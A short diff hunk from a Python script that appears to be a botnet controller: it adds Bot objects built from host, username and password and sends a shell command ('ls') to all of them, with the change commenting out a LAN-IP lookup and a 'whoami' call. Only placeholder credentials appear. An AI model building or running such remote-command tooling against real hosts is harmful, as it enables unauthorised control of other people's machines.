@@ -67,7 +67,7 @@ botnet = []
 def add_bot(host, user, password):
     new_bot = Bot(host, user, password)
     botnet.append(new_bot)
-local_lan_ip = get_lan_ip
-user = subprocess.check_output(['whoami'])
+#local_lan_ip = get_lan_ip
+#user = subprocess.check_output(['whoami'])
 add_bot('ip','user','password')
 command_bots('ls')
